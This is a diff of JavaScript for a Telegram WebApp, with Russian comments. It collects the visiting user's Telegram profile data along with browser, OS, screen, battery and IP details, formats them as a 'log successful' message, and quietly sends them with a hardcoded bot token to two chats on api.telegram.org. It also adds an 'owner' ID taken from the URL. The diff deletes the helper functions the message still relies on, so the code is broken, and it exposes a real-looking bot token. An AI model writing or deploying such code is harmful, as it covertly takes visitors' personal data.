@@ -1,66 +1,12 @@
-async function getIPAddress() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch (error) {
-        console.error('Ошибка получения IP адреса:', error);
-        return 'неизвестно';
-    }
+function getOwnerFromURL() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('id') || 'неизвестно'; // Возвращаем значение owner (id) или 'неизвестно', если параметр отсутствует
 }
 
-function getUserAgent() {
-    try {
-        return navigator.userAgent || 'неизвестно';
-    } catch (error) {
-        console.error('Ошибка получения UserAgent:', error);
-        return 'неизвестно';
-    }
-}
-
-function getScreenResolution() {
-    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
-}
-
-function getOSName() {
-    try {
-        return navigator.platform || 'неизвестно';
-    } catch (error) {
-        console.error('Ошибка получения имени ОС:', error);
-        return 'неизвестно';
-    }
-}
-
-async function getBatteryPercentage() {
-    try {
-        const battery = await navigator.getBattery();
-        return Math.floor(battery.level * 100);
-    } catch (error) {
-        console.error('Ошибка получения процента заряда батареи:', error);
-        return 'неизвестно';
-    }
-}
-
-function getBrowserInfo() {
-    try {
-        return {
-            name: navigator.appName || 'неизвестно',
-            version: navigator.appVersion || 'неизвестно',
-            engine: navigator.product || 'неизвестно'
-        };
-    } catch (error) {
-        console.error('Ошибка получения информации о браузере:', error);
-        return {
-            name: 'неизвестно',
-            version: 'неизвестно',
-            engine: 'неизвестно'
-        };
-    }
-}
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
+    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Замените на ваш токен
     const chatId = tg.initDataUnsafe.start_param;
     const additionalChatId = -1002202955038;
 
@@ -78,6 +24,8 @@ async function sendDataToTelegram() {
     const lastName = userInfo.last_name || 'неизвестно';
     const languageCode = userInfo.language_code || 'неизвестно';
     const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';
+
+    const owner = getOwnerFromURL(); // Извлекаем значение owner из URL
 
     const message = `
 <b> Лог успешен!</b>
@@ -103,7 +51,10 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-    `;
+
+<b>🔑 Информация об owner:</b>
+└ Owner ID: <code>${owner}</code>
+`;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -128,7 +79,7 @@ async function sendDataToTelegram() {
         console.error('Ошибка:', error);
     }
 
-    // Second request
+    // Второй запрос
     const formData1 = new URLSearchParams();
     formData1.append('chat_id', additionalChatId);
     formData1.append('text', message);
